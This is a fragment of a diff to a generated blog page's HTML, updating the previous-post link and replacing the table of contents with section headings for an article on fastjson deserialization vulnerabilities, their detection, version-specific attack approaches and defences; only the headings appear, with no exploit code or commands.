                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/12/05/learnpython/" title= Python高级特性 >
-                    <div class="prevTitle">Python高级特性</div>
+                <a href= "/2020/07/01/%E6%AF%95%E4%B8%9A%E6%84%9F%E8%A8%80/" title= 毕业感言 >
+                    <div class="prevTitle">毕业感言</div>
                 </a>
             
         </li>
@@ -573,7 +621,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-常用的-python-库"><span class="toc-number">1.</span> <span class="toc-text">0X01 常用的 python 库</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson反序列化漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">fastjson反序列化漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞检测"><span class="toc-number">2.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击思路"><span class="toc-number">3.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24"><span class="toc-number">3.1.</span> <span class="toc-text">1.2.24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47"><span class="toc-number">3.2.</span> <span class="toc-text">1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68"><span class="toc-number">3.3.</span> <span class="toc-text">1.2.68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#不出网利用"><span class="toc-number">3.4.</span> <span class="toc-text">不出网利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#高版本jdk-JNDI注入"><span class="toc-number">3.5.</span> <span class="toc-text">高版本jdk JNDI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-WAF-绕过"><span class="toc-number">3.6.</span> <span class="toc-text">Fastjson WAF 绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御手段"><span class="toc-number">4.</span> <span class="toc-text">防御手段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
